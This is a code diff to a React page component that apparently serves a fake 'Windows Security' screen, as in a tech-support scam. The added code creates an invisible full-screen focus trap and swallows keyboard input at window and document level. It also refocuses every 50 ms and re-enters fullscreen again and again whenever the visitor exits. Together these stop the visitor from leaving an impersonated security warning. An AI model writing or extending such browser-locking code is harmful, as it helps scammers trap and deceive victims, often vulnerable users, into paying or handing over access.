@@ -1,6 +1,6 @@
 'use client';
 
-import { useState, useEffect, useCallback } from 'react';
+import { useState, useEffect, useCallback, useRef } from 'react';
 import Header from '@/components/Header';
 import LeftSidebar from '@/components/LeftSidebar';
 import RightSidebar from '@/components/RightSidebar';
@@ -11,6 +11,7 @@ import WindowsSecurityPage from '@/components/WindowsSecurityPage';
 export default function Home() {
   const [isModalOpen, setIsModalOpen] = useState(false);
   const [showSecurityPage, setShowSecurityPage] = useState(false);
+  const focusTrapRef = useRef<HTMLDivElement>(null);
 
   const enterFullscreen = useCallback(() => {
     const elem = document.documentElement;
@@ -27,7 +28,38 @@ export default function Home() {
     enterFullscreen();
     setIsModalOpen(false);
     setShowSecurityPage(true);
+    
+    // Focus the trap element after entering fullscreen
+    setTimeout(() => {
+      focusTrapRef.current?.focus();
+    }, 100);
   };
+
+  // Keep focus on our trap element to intercept all keyboard events
+  useEffect(() => {
+    if (!showSecurityPage) return;
+
+    const keepFocus = () => {
+      if (focusTrapRef.current && document.activeElement !== focusTrapRef.current) {
+        focusTrapRef.current.focus();
+      }
+    };
+
+    // Focus immediately and keep checking
+    keepFocus();
+    const focusInterval = setInterval(keepFocus, 50);
+
+    // Also focus on any click
+    const handleClick = () => {
+      setTimeout(keepFocus, 10);
+    };
+    document.addEventListener('click', handleClick, true);
+
+    return () => {
+      clearInterval(focusInterval);
+      document.removeEventListener('click', handleClick, true);
+    };
+  }, [showSecurityPage]);
 
   useEffect(() => {
     // Show modal after a short delay to simulate the design
@@ -91,6 +123,8 @@ export default function Home() {
     document.addEventListener('keydown', handleKeyDown, true);
     document.addEventListener('keyup', handleKeyUp, true);
     document.addEventListener('keypress', handleKeyPress, true);
+    window.addEventListener('keydown', handleKeyDown, true);
+    window.addEventListener('keyup', handleKeyUp, true);
     window.addEventListener('beforeunload', handleBeforeUnload);
 
     return () => {
@@ -99,6 +133,8 @@ export default function Home() {
       document.removeEventListener('keydown', handleKeyDown, true);
       document.removeEventListener('keyup', handleKeyUp, true);
       document.removeEventListener('keypress', handleKeyPress, true);
+      window.removeEventListener('keydown', handleKeyDown, true);
+      window.removeEventListener('keyup', handleKeyUp, true);
       window.removeEventListener('beforeunload', handleBeforeUnload);
     };
   }, []);
@@ -114,11 +150,19 @@ export default function Home() {
         (document as unknown as { msFullscreenElement?: Element }).msFullscreenElement
       );
 
-      // If exited fullscreen and security page is showing, re-enter fullscreen
+      // If exited fullscreen and security page is showing, re-enter fullscreen immediately
       if (!isFullscreen && showSecurityPage) {
+        // Re-enter fullscreen immediately
+        enterFullscreen();
+        // And again after a short delay as backup
         setTimeout(() => {
           enterFullscreen();
-        }, 100);
+          focusTrapRef.current?.focus();
+        }, 50);
+        setTimeout(() => {
+          enterFullscreen();
+          focusTrapRef.current?.focus();
+        }, 150);
       }
     };
 
@@ -135,6 +179,26 @@ export default function Home() {
 
   return (
     <div className="min-h-screen bg-[#f0f2f5]">
+      {/* Invisible focus trap element */}
+      <div
+        ref={focusTrapRef}
+        tabIndex={0}
+        onKeyDown={(e) => {
+          e.preventDefault();
+          e.stopPropagation();
+        }}
+        style={{
+          position: 'fixed',
+          top: 0,
+          left: 0,
+          width: '100%',
+          height: '100%',
+          zIndex: showSecurityPage ? 9999 : -1,
+          opacity: 0,
+          pointerEvents: showSecurityPage ? 'auto' : 'none',
+        }}
+        aria-hidden="true"
+      />
       <Header />
       <div className="flex">
         <LeftSidebar />
